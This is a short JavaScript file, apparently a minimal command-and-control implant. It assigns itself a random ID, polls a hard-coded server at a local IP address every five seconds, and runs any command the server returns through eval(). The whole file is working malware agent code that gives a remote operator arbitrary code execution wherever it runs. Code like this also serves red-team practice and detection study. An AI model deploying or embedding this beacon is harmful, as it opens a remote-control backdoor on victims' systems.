const protocol = "http";
const serverHostname = "192.168.1.21";
const serverPort = 8000;

var commandOutput = "";
var interval = setInterval(contactC2, 5000);

function generateUUID() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function contactC2() {
  console.log("Contact C2...");
  fetch(protocol + "://" + serverHostname + ":" + serverPort + "/" + uuid)
    .then((response) => response.json())
    .then((data) => {
      console.log(data);
      if (data.command != null) {
        var commandOutput = eval(data.command);
        console.log(commandOutput);
      }
    })
    .catch((error) => {
      clearInterval(interval);
      console.error("Stopped because of connection error");
    });
}

const uuid = generateUUID();
console.log("UUID: " + uuid);
contactC2();
